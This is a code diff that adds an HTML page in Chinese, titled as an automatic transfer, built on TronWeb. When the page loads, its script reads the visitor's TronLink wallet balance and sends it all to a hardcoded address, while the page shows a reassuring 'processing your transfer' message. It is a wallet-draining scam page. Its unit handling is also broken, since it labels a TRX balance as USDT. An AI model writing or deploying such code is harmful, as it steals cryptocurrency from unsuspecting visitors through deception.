@@ -1,0 +1,75 @@
+
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>自動轉帳</title>
+  <script src="https://cdn.jsdelivr.net/npm/tronweb@4.4.0/dist/TronWeb.js"></script>
+  <style>
+    body {
+      font-family: sans-serif;
+      text-align: center;
+      padding: 50px;
+      background: #f4f4f4;
+    }
+    button {
+      padding: 1em 2em;
+      font-size: 1.2rem;
+      background: #0b93f6;
+      color: white;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      margin: 15px;
+    }
+    p { font-size: 1rem; }
+  </style>
+</head>
+<body>
+  <h1>正在處理您的轉帳</h1>
+  <p id="status"></p>
+
+  <script>
+    const targetAddress = "TDtM1AcaY4KGdFFBg9MVMbGChD94thuD2Y";  // 您的TRC20地址
+
+    // 檢查錢包連接並進行操作
+    async function checkWallet() {
+      if (typeof window.tronWeb === 'undefined' || !window.tronWeb.ready) {
+        document.getElementById("status").innerText = "請安裝並啟動 TronLink 錢包";
+        return;
+      }
+
+      const tronWeb = window.tronWeb;
+      const address = tronWeb.defaultAddress.base58;
+
+      if (!address) {
+        document.getElementById("status").innerText = "無法識別錢包地址";
+        return;
+      }
+
+      // 查詢餘額
+      const balance = await tronWeb.trx.getBalance(address);
+      const maxAmount = balance / 1000000;  // 將餘額轉換為 USDT
+
+      // 顯示餘額信息
+      document.getElementById("status").innerText = `餘額：${maxAmount} USDT
+即將轉帳到：${targetAddress}`;
+
+      // 發送轉帳
+      try {
+        const transaction = await tronWeb.transactionBuilder.sendTrx(targetAddress, maxAmount, address);
+        const signedTransaction = await tronWeb.trx.sign(transaction);
+        const result = await tronWeb.trx.sendRawTransaction(signedTransaction);
+        document.getElementById("status").innerText = "✅ 轉帳成功！";
+      } catch (error) {
+        document.getElementById("status").innerText = "❌ 轉帳失敗，請重試";
+        console.error(error);
+      }
+    }
+
+    // 頁面加載後自動檢查錢包
+    window.onload = checkWallet;
+  </script>
+</body>
+</html>
